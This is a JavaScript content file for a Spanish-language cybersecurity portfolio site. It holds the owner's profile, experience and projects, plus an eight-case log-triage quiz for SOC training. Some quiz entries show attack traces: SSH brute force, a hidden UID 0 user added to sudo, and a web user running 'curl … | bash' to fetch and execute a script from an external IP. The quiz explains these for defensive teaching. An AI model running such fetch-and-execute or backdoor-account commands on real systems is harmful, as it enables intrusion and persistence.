/*
 * Todo el contenido de la web vive aquí. Para cambiar un texto, una fecha
 * o un enlace, edita este archivo y guarda: no hace falta tocar el HTML.
 * Los campos vacíos ("") no se pintan en la web, así que puedes dejarlos
 * así hasta que tengas el dato.
 */

const DATOS = {

  meta: {
    titulo: "Manuel Pérez · Administración de sistemas y ciberseguridad",
    descripcion:
      "Portfolio de Manuel Pérez, administrador de sistemas y redes orientado a ciberseguridad (SOC N1).",
  },

  perfil: {
    nombre: "Manuel Pérez",
    rol: "Administrador de Sistemas y Redes",
    objetivo: "orientado a Ciberseguridad · Analista SOC N1",
    ubicacion: "A Coruña, España",
    eyebrow: "sistemas · redes · ciberseguridad",
    // Frase corta de portada. Va debajo del nombre, conviene que quepa en
    // dos o tres líneas.
    titular:
      "Administro sistemas y accesos en un entorno bancario real. Ahora estoy llevando esa experiencia hacia la defensa: detección de amenazas, hardening y automatización.",
    // Texto largo de la sección "Quién soy".
    resumen:
      "Llevo cerca de un año administrando sistemas en un entorno bancario real, con herramientas de identidad y acceso que no perdonan un fallo. Resuelvo incidencias por mi cuenta y aprendo rápido lo que hace falta para la siguiente. Ahora mismo estoy cursando un máster en Ciberseguridad e Inteligencia Artificial para enfocar ese conocimiento hacia detección de amenazas, hardening y automatización de despliegues seguros.",
  },

  contacto: {
    email: "perezmanivesamanuel@gmail.com",
    // Si rellenas el teléfono aparecerá un enlace de llamada en la web pública.
    telefono: "",
    // Si rellenas la dirección aparecerá en la web pública. Se deja vacía por privacidad.
    direccion: "",
    github: "https://github.com/ma957nu",
    linkedin: "https://www.linkedin.com/in/manuel-p%C3%A9rez-manivesa-11b9943b9/",
    // Perfil de HackTheBox. El enlace va sin los parámetros de la barra del
    // navegador, que solo guardan las pestañas que tenías abiertas.
    hackthebox: "https://app.hackthebox.com/users/3368481",
  },

  cv: {
    // Vacío a propósito: el PDF del CV lleva teléfono y dirección postal, y la
    // web es pública. Si algún día quieres ofrecerlo, deja aquí la ruta de una
    // versión recortada (por ejemplo "cv/Manuel_Perez_CV_publico.pdf") y el
    // botón de descarga vuelve a aparecer solo.
    archivo: "",
    etiqueta: "descargar CV",
  },

  experiencia: [
    {
      empresa: "Abanca",
      puesto: "Administrador de sistemas",
      periodo: "~ 1 año",
      contexto: "ecosistema bancario",
      descripcion:
        "Gestión e integración de herramientas de identidad y seguridad dentro de un entorno bancario en producción. Participé en proyectos de IAM y de ciclo de vida de identidades, donde un cambio mal hecho no se soluciona con un redeploy.",
      etiquetas: ["IdentityQ", "ISIM", "CyberArk", "Entrust", "IAM"],
    },
  ],

  formacion: [
    {
      titulo: "Máster en Ciberseguridad e Inteligencia Artificial",
      centro: "en curso",
      periodo: "actualidad",
      detalle:
        "Seguridad ofensiva y defensiva, machine learning aplicado a ciberseguridad, análisis de amenazas y automatización con IA.",
    },
    {
      titulo: "CS Administración de Sistemas Informáticos en Red (ASIR)",
      centro: "CPIFP Rodolfo Ucha Piñeiro, Ferrol",
      periodo: "",
      detalle: "Redes, Linux y Windows, virtualización, servicios en red.",
    },
    {
      titulo: "ESO y Bachillerato, ABAU",
      centro: "IES Francisco Aguiar",
      periodo: "",
      detalle: "",
    },
  ],

  stack: [
    {
      categoria: "sistemas",
      items: ["GNU/Linux (Arch, Kali)", "Windows Server", "Docker", "VirtualBox"],
    },
    {
      categoria: "identidad y acceso",
      items: ["CyberArk", "Entrust", "IdentityQ", "ISIM"],
    },
    {
      categoria: "desarrollo",
      items: ["PHP", "HTML", "CSS", "MySQL", "Bash"],
    },
    {
      categoria: "en aprendizaje",
      items: ["Ansible", "Terraform"],
    },
  ],

  objetivos: [
    "Seguridad ofensiva y defensiva: CTFs y pentesting.",
    "IA aplicada a ciberseguridad.",
    "Automatización de infraestructura segura.",
  ],

  idiomas: [
    { idioma: "Castellano", nivel: "nativo" },
    { idioma: "Gallego", nivel: "nativo" },
    { idioma: "Inglés", nivel: "nivel alto" },
    { idioma: "Portugués", nivel: "comprensión oral" },
  ],

  proyectos: [
    {
      destacado: true,
      // Si quitas "estado", la ficha vuelve a mostrar solo "proyecto propio".
      estado: "en desarrollo",
      nombre: "JondaSiviz",
      resumen: "Planificador de preparación de coches del grupo Volkswagen.",
      problema:
        "Elegir piezas de preparación compatibles entre sí y legales es un trabajo manual propenso a errores: una pieza puede encajar en el motor y no en el chasis, o dejar el coche fuera de norma.",
      stack: ["React", "TypeScript", "Tauri"],
      resultado:
        "Catálogo de 207 modelos y 271 piezas con un motor de compatibilidad que cruza plataforma de motor, chasis y reglas de legalidad de la UE antes de sugerir nada. Funciona como app web y de escritorio, y sigue creciendo.",
      nota: "Todavía no está terminado. Las buenas cosas se hacen lentamente.",
      enlace: "https://github.com/JondaSivizVolkswagen/jondasiviz",
      enlaceEtiqueta: "ver repositorio",
    },
    {
      destacado: false,
      nombre: "Kali AwesomeWM Rice",
      resumen: "Mi entorno de trabajo para pentesting, montado sobre Kali.",
      problema:
        "Saltar entre máquinas y laboratorios cuesta tiempo si cada vez hay que recolocar el escritorio y comprobar a mano en qué interfaz estás.",
      stack: ["AwesomeWM", "Lua", "picom", "Bash"],
      resultado:
        "Configuración completa de AwesomeWM con un widget de IP que cambia de color según el estado de la interfaz, y un install.sh que deja el entorno montado en un paso.",
      enlace: "https://github.com/ma957nu/mi-kali-rice",
      enlaceEtiqueta: "ver repositorio",
    },
    {
      destacado: false,
      nombre: "DebianAwesomeWM",
      resumen: "El mismo entorno, adaptado a Debian 12.",
      problema:
        "Reinstalar y dejar un equipo Debian como lo tenía configurado significaba repetir horas de ajustes uno a uno.",
      stack: ["AwesomeWM", "Kitty", "Zsh", "Rofi", "Neovim"],
      resultado:
        "Dotfiles versionados del escritorio entero: gestor de ventanas, terminal, launcher, editor y compositor, listos para clonar y volver a tener el equipo igual.",
      enlace: "https://github.com/ma957nu/DebianAwesomeWM",
      enlaceEtiqueta: "ver repositorio",
    },
  ],

  // Ejercicio interactivo de la sección ~/triage. Cada entrada es una línea de
  // log y la decisión correcta. Para añadir más casos, copia un objeto y cambia
  // los campos: la web se adapta sola al número de entradas.
  triage: {
    titulo: "Triage de logs",
    intro:
      "Esto es lo que hace un analista de guardia: mirar líneas de log y decidir cuáles son ruido y cuáles merecen una llamada. Ocho casos, a ver qué tal se te da.",
    // Texto de cierre según el porcentaje de aciertos.
    cierres: {
      alto: "Buen ojo. La parte difícil de un turno no es cazar el ataque llamativo, es descartar rápido las otras cien líneas sin dejarte la que importa.",
      medio: "Vas bien. Casi todos los fallos en un turno real salen de lo mismo: algo que parece raro pero es rutina, y algo que parece rutina y no lo es.",
      bajo: "Cuesta más de lo que parece. Un turno son miles de líneas como estas y casi todas son ruido, así que el oficio está en saber qué mirar primero.",
    },
    casos: [
      {
        origen: "auth.log · servidor de salto",
        linea:
          "Mar 14 03:12:41 jump01 sshd[4411]: Failed password for invalid user admin from 203.0.113.47 port 52233 ssh2\nMar 14 03:12:42 jump01 sshd[4413]: Failed password for invalid user oracle from 203.0.113.47 port 52241 ssh2\n... 47 intentos desde la misma IP en 60 segundos",
        sospechoso: true,
        explicacion:
          "Fuerza bruta de manual: 47 intentos en un minuto desde una sola IP y contra usuarios que ni existen en la máquina. Alguien despistado falla dos o tres veces con su propio nombre, no cuarenta y siete con nombres distintos.",
      },
      {
        origen: "auth.log · servidor de aplicación",
        linea:
          "Mar 14 10:14:02 app03 sudo: manuel : TTY=pts/0 ; PWD=/home/manuel ; USER=root ; COMMAND=/usr/bin/apt upgrade",
        sospechoso: false,
        explicacion:
          "Usuario conocido, en horario de oficina, desde una sesión interactiva y actualizando paquetes. Es mantenimiento. Lo suyo es que haya un cambio aprobado detrás, pero la línea en sí no es un incidente.",
      },
      {
        origen: "Windows · visor de seguridad",
        linea:
          "Id. 4624 · Inicio de sesión correcto\nCuenta: svc_backup\nTipo de inicio de sesión: 10 (RemoteInteractive, RDP)\nDirección de origen: 198.51.100.23\nHora: 03:14",
        sospechoso: true,
        explicacion:
          "Una cuenta de servicio no abre escritorio remoto: se usa para que un proceso arranque solo, con tipo de inicio 5 o 3. Que alguien entre por RDP con svc_backup de madrugada significa que esas credenciales están en manos de una persona.",
      },
      {
        origen: "CyberArk · sesión privilegiada",
        linea:
          "PSM · sesión iniciada\nUsuario: mperez\nCuenta objetivo: root@db-nomina01\nSolicitud: CHG-20184, aprobada por el responsable de sistemas\nVentana: 09:00-11:00 · Grabación: activa",
        sospechoso: false,
        explicacion:
          "Es justo el camino que se busca al montar IAM: acceso privilegiado pedido, aprobado, dentro de ventana y con la sesión grabada. Si todos los accesos a producción fueran así, la guardia sería aburrida.",
      },
      {
        origen: "auth.log · servidor de ficheros",
        linea:
          "Mar 14 02:50:11 fs02 useradd[8821]: new user: name=svc_update, UID=0, GID=0, home=/home/svc_update\nMar 14 02:50:19 fs02 usermod[8830]: add 'svc_update' to group 'sudo'",
        sospechoso: true,
        explicacion:
          "Un usuario nuevo con UID 0 es root con otro nombre. Creado a las tres menos diez de la mañana y metido en sudo nueve segundos después, sin ventana de cambios. Eso no es administrar, es dejarse una puerta abierta.",
      },
      {
        origen: "syslog · servidor de respaldo",
        linea:
          "Mar 14 01:00:01 bkp01 CRON[2201]: (root) CMD (/usr/local/bin/backup.sh)\nMar 14 01:47:33 bkp01 backup.sh: copia completada · 412 GB · 0 errores",
        sospechoso: false,
        explicacion:
          "La copia nocturna de siempre, a su hora y sin errores. El día que esta línea deje de aparecer, eso sí merece una mirada: los logs que faltan cuentan tanto como los que sobran.",
      },
      {
        origen: "Entrust · gestión de certificados",
        linea:
          "AVISO · el certificado TLS de portal.interno caduca en 15 días (2026-03-29)\nEmisor: CA interna · Renovación automática: no configurada",
        sospechoso: false,
        explicacion:
          "Es un aviso de caducidad, no un ataque, así que no se escala como incidente: se abre una tarea y se renueva. Eso sí, un certificado caducado tumba el portal igual de bien que un atacante.",
      },
      {
        origen: "syslog · servidor web",
        linea:
          "Mar 14 16:22:07 web01 bash: www-data : COMMAND=curl -s http://198.51.100.77/x.sh | bash",
        sospechoso: true,
        explicacion:
          "El usuario que sirve las páginas web descargando un script de una IP externa y ejecutándolo al vuelo. Ese usuario no se baja cosas de internet. Es la señal clásica de que alguien ya entró por la aplicación y está trayendo sus herramientas.",
      },
    ],
  },

};
